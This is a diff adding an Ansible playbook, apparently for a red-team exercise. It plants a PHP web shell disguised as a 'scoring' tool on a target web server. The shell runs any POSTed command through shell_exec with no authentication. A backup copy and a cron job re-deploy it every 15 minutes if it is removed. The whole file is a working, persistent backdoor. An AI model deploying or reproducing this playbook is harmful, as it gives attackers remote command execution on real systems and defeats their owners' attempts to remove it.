@@ -1,0 +1,65 @@
+---
+- name: Deploy custom "scoring" web shell for controlled access
+  hosts: target_machine
+  become: yes
+
+  tasks:
+    - name: Ensure Apache and PHP are installed
+      apt:
+        name: "{{ item }}"
+        state: present
+      loop:
+        - apache2
+        - php
+      when: ansible_os_family == "Debian"
+
+    - name: Create directory for "scoring" tool
+      file:
+        path: /var/www/html/scoring
+        state: directory
+        owner: www-data
+        mode: '0755'
+
+    - name: Deploy custom "scoring" web script to main location
+      copy:
+        content: |
+          <?php
+          if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+              echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
+          } else {
+              echo "Unauthorized access.";
+          }
+          ?>
+        dest: /var/www/html/scoring/scoring.php
+        owner: www-data
+        mode: '0755'
+
+    - name: Deploy custom "scoring" web script to backup location
+      copy:
+        content: |
+          <?php
+          if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+              echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
+          } else {
+              echo "Unauthorized access.";
+          }
+          ?>
+        dest: /var/backups/scoring.bak.php
+        owner: www-data
+        mode: '0755'
+
+    - name: Set up cron job to check and re-deploy "scoring" tool if removed
+      cron:
+        name: "Re-deploy scoring tool if removed"
+        minute: "*/15"
+        job: "test -f /var/www/html/scoring/scoring.php || cp /var/backups/scoring.bak.php /var/www/html/scoring/scoring.php"
+
+    - name: Ensure Apache is running
+      service:
+        name: apache2
+        state: started
+        enabled: true
+
+    - name: Display scoring tool URL for red team
+      debug:
+        msg: "Scoring tool deployed at http://{{ ansible_host }}/scoring/scoring.php"
